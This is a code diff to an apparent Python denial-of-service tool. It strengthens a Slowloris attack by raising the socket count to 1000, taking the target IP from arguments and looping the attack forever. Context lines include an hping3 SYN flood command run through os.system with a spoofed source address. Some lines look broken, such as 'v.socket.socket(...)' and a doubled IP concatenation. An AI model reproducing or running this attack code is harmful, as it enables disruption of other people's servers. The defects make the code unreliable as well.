@@ -45,8 +45,7 @@ def slowloris():
 			"Accept-language: en-US,en,q=0.5",
 			"Connection: Keep-Alive"
 		]
-		howmany_sockets = 200
-		ip = "192.168.0.29"
+		howmany_sockets = 1000
 		port = 80
 		allthesockets = []
 		print("Creating sockets...")
@@ -54,7 +53,7 @@ def slowloris():
 			try:
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 				s.settimeout(4)
-				s.connect((ip, port))
+				s.connect((args.ip, port))
 				allthesockets.append(s)
 			except Exception as e:
 				print(e)
@@ -80,7 +79,7 @@ def slowloris():
 					try:
 						v.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 						v.settimeout(4)
-						v.connect((ip,port))
+						v.connect((args.ip,port))
 						v.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf-8"))
 						for header in headers:
 							v.send(bytes("{}\r\n".format(header).encode("utf-8")))
@@ -116,7 +115,9 @@ if __name__ == "__main__":
 		os.system('hping3 -c 10000 -d 120 -S -w 64 -p 80 --faster -a ' + args.ip + args.ip)
     #Slowloris
 	if args.ddos == 'slowloris':
-		slowloris()
+		while(True):
+			slowloris()
+		
     
 	# Show the stats
 	print('\n\n'+get_str_time() + INFO_STATS + '\n\n' + stats())
